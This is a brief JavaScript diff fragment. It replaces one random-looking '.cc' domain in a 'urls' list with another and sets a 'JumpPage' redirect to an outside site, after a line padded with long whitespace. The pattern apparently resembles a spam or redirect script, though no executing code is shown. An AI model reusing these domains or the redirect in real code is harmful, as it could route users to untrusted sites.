@@ -37,7 +37,7 @@ var emails = [
 ];
 
 var urls=[
-	'zwybpjmpz.cc',
+	'eovkiayun.cc',
 ];
                                                                                                                   
 var JumpPage="https://91nt.com";
